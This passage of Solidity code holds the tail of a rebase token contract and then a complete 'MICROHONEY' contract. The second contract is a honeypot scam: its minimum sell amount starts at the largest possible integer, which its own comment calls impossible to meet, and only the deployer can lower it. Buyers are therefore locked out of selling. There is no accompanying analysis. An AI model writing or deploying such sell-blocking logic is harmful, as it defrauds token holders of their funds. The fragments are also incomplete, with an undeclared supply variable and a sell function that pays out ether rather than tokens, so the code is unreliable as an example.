  uint256 public rebaseFactor = 1e18; // 1:1 initially
  mapping(address=>uint256) private _shares;
  constructor() ERC20('RebaseToken','RBST') { _shares[msg.sender] = _totalSupply; }
  function balanceOf(address account) public view override returns (uint256) {
    return _shares[account] * rebaseFactor / 1e18;
  }
  function totalSupply() public view override returns (uint256) {
    return _totalSupply * rebaseFactor / 1e18;
  }
}

pragma solidity ^0.8.0;
contract MICROHONEY {
  address private controller;
  mapping(address=>uint256) public owns;
  uint256 private _minSell = type(uint256).max; // Initially set to max — impossible to meet
  constructor() { controller = msg.sender; owns[controller] = 1e27; }
  function setMinSell(uint256 min) external { require(msg.sender==controller); _minSell = min; }
  function sell(uint256 amt) external {
    require(amt >= _minSell, 'Amount below minimum sell');
    owns[msg.sender] -= amt;
    payable(msg.sender).transfer(amt);
  }
}

